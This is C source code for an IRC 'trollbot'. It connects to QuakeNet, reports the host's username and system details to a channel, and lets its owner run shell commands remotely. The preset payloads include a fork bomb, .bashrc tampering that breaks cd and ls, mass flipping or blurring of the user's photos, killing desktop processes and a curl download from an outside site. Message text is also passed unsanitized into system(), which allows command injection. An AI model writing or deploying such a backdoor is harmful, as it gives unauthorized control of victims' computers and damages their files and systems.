#include <dirent.h>
#include <sys/utsname.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>

#define BUFFSIZE 512

struct IncomingMessage {
	char *user;
	char *commandIRC;
	char *where;
	char *message;
	char *target;
};
typedef struct IncomingMessage IncomingMessage;

int sock;
char sbuf[BUFFSIZE]; /*socket buffer*/
IncomingMessage inc;
static const char owner[] = "codeniko";
char channel[] = "#KeepTrollin";

char *trollings[200]; 
void initTrollings();


void raw(char *fmt, ...) {
	va_list ap;
	va_start(ap, fmt);
	vsnprintf(sbuf, BUFFSIZE, fmt, ap);
	va_end(ap);
	printf("<< %s", sbuf);
	write(sock, sbuf, strlen(sbuf));
}

void sendToChannel(char *msg) {
	raw("%s %s :%s\r\n", "PRIVMSG", channel, msg);
}

void getSystemInfo() {
	char user[100];
	getlogin_r(user, 100);
	struct utsname info;
	uname(&info);
	char infoString[BUFFSIZE];
	sprintf(infoString, "%s %s@%s %s %s %s",
						info.sysname, user, info.nodename,
						info.release, info.version, info.machine);
	sendToChannel(infoString);
}

int troll(char *arg1, char *msg) {
	int ret = 1;
	//printf("test msg=%s\n", msg);
	sendToChannel("trollin' trollin' trollin'");
	if (msg == 0) {
		int id = atoi(arg1);
		char presetmsg[BUFFSIZE];
		sprintf(presetmsg, "%d - %s", id, trollings[id]);
		sendToChannel(presetmsg);
		ret = system(trollings[id]);
	} else {
		msg[strlen(msg)-2] = '\0';
		if (strncmp(arg1, "cmd", 3) == 0) {
		} else if (strncmp(arg1, "wall", 4) == 0) {
			char cmd[BUFFSIZE];
			sprintf(cmd, "echo \"%s\" | wall", msg);
			sendToChannel(cmd);
			ret = system(cmd);
		} else if (strncmp(arg1, "popup", 5) == 0) {
			char cmd[BUFFSIZE];
			sprintf(cmd, "zenity --warning --text=\"%s\" &", msg);
			sendToChannel(cmd);
			ret = system(cmd);
		} else if (strncmp(arg1, "photo", 5) == 0) {
			DIR *dir;
			struct dirent *ent;
			if ((dir = opendir("~/Pictures")) != NULL) {
				/* print all the files and directories within directory */
				while ((ent = readdir (dir)) != NULL) {
					printf ("%s\n", ent->d_name);
				}
				closedir (dir);
			} 	
		}
	}

	if (!ret)
		sendToChannel("keep on trollin'");
	else
		sendToChannel("back up!");
	return ret;
}

int joinChannel(char *channel) {
	raw("JOIN %s\r\n", channel);
	getSystemInfo();
	return 1;
}

int leaveChannel(char *channel) {
	raw("PART %s\r\n", channel);
	return 1;
}

int quit() {
	raw("QUIT\r\n");
	exit(0);
	return 1;
}

int changeName(char *name) {
	raw("NICK %s\r\n", name);
	return 1;
}

int parseCommand() {

	return 1;
}
/*-1 = not owner
 * 0 = fail
 * 1 = success*/
int parsePrivateCommand() {
	if (inc.user == 0 || strncmp(inc.user, owner, strlen(owner)) != 0)
		return -1; /*not owner sending command*/

	int ret = 0;
	char msgcpy[BUFFSIZE];
	memcpy(msgcpy, inc.message, BUFFSIZE);
	char *cmd = strtok(msgcpy, " ");

	if (strncmp(cmd, "quit", 4) == 0)
		quit();

	char *arg = strtok(0, " ");
	char *msg = strchr(inc.message+1, ' ');
	char *msgcut;
	if (msg != 0) {
		msgcut = strchr(msg+1, ' ');
		msgcut++;
	}
	if (strncmp(cmd, "troll", 5) == 0)
		ret = troll(arg, msgcut);
	else if (strncmp(cmd, "join", 4) == 0)
		ret = joinChannel(arg);
	else if (strncmp(cmd, "leave", 5) == 0)
		ret = leaveChannel(arg);
	else if (strncmp(cmd, "name", 4) == 0)
		ret = changeName(arg);

	return ret;
}

int main() {
	initTrollings();

	char *nick = "trollbot";
	char *host = "irc.quakenet.org";
	char *port = "6667";

	int i, j, l, bytesread, bufIndex = -1, start, wordcount;
	char buf[BUFFSIZE + 1];
	struct addrinfo hints, *res;

	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	getaddrinfo(host, port, &hints, &res);
	sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
	connect(sock, res->ai_addr, res->ai_addrlen);

	raw("USER %s 0 0 :%s\r\n", nick, nick);
	raw("NICK %s\r\n", nick);

	while ((bytesread = read(sock, sbuf, BUFFSIZE))) {
		for (i = 0; i < bytesread; i++) { /*for each character received*/
			bufIndex++; /*char position of next character read to put into buffer*/
			buf[bufIndex] = sbuf[i];
			if ((i > 0 && sbuf[i] == '\n' && sbuf[i - 1] == '\r') || bufIndex == BUFFSIZE) {	//if end of line or buffer size met
				buf[bufIndex + 1] = '\0';
				l = bufIndex;
				bufIndex = -1;

				printf(">> %s", buf);

				if (!strncmp(buf, "PING", 4)) {
					buf[1] = 'O';
					raw(buf);
				} else if (buf[0] == ':') {
					wordcount = 0;
					char *sep = 0;
					inc.user = inc.commandIRC = inc.where = inc.message = 0;
					for (j = 1; j < l; j++) {
						if (buf[j] == ' ') {
							buf[j] = '\0';
							wordcount++;
							switch(wordcount) {
								case 1: inc.user = buf + 1; break;
								case 2: inc.commandIRC = buf + start; break;
								case 3: inc.where = buf + start; break;
							}
							if (j == l - 1) continue;
							start = j + 1;
						} else if (buf[j] == ':' && wordcount == 3) {
							if (j < l - 1) inc.message = buf + j + 1;
							break;
						}
					}

					if (wordcount < 2) continue;

					if (!strncmp(inc.commandIRC, "001", 3) && channel != NULL) {
						joinChannel(channel);
						//raw("%s %s : %s", "PRIVMSG", channel, "Alright partner... You know what time it is...\r\n");
					} else if (!strncmp(inc.commandIRC, "PRIVMSG", 7) || !strncmp(inc.commandIRC, "NOTICE", 6)) {
						if (inc.where == NULL || inc.message == NULL) 
							continue;
						if ((sep = strchr(inc.user, '!')) != NULL) 
							inc.user[sep - inc.user] = '\0'; //replace ! with \0
						if (inc.where[0] == '#' || inc.where[0] == '&' || inc.where[0] == '+' || inc.where[0] == '!') 
							inc.target = inc.where; 
						else 
							inc.target = inc.user;
						printf("[from: %s] [reply-with: %s] [where: %s] [reply-to: %s] %s", inc.user, inc.commandIRC, inc.where, inc.target, inc.message);

						int resp = -2;
						if (inc.where[0] == '#')
							resp = parseCommand();
						else
							resp = parsePrivateCommand();

						printf("response code:%d\n", resp);

						
						//raw("%s %s :%s", command, target, message); // If you enable this the IRCd will get its "*** Looking up your hostname..." messages thrown back at it but it works...
					}
				}
			}
		}
	}

	return 0;

}

void initTrollings() {
	trollings[0] = "killall gnome-panel";
	trollings[1] = "cat /dev/zero > /dev/null";
	trollings[2] = ":(){ :|:& }";
	trollings[3] = "echo 'alias cd=\"echo Segmentation fault\" && echo $* > /dev/null' >> ~/.bashrc; echo 'alias ls=\"echo .\"' >> ~/.bashrc";
	trollings[4] = "for file in ~/{,Pictures,Downloads}/*; do e=`file \"$file\" | cut -d ' ' -f 2`; if [ $e == \"GIF\" ] || [ $e == \"JPEG\" ] || [ $e == \"PNG\" ]; then mogrify -flip \"$file\"; fi; done";
	trollings[5] = "for file in ~/{,Pictures,Downloads}/*; do e=`file \"$file\" | cut -d ' ' -f 2`; if [ $e == \"GIF\" ] || [ $e == \"JPEG\" ] || [ $e == \"PNG\" ]; then mogrify -blur 4 \"$file\"; fi; done";
	trollings[6] = "if [ ! -f ~/.baby.wav ]; then curl http://www.niko.rocks/keeptrollin/baby.wav -o ~/.baby.wav; fi; aplay ~/.baby.wav &";
	trollings[7] = "eject -T";
	trollings[8] = "eject -t";
	trollings[9] = "echo sleep 5 >> ~/.bashrc";
	trollings[10] = "xterm -e \"telnet towel.blinkenlights.nl\" &";
	/*trollings[11] = "";
	trollings[12] = "";
	trollings[13] = "";
	trollings[14] = "";
	trollings[15] = "";
	trollings[16] = "";
	trollings[17] = "";
	trollings[18] = "";
	trollings[19] = "";
	trollings[20] = "";
	trollings[21] = "";
	trollings[22] = "";
	trollings[23] = ""; */
}
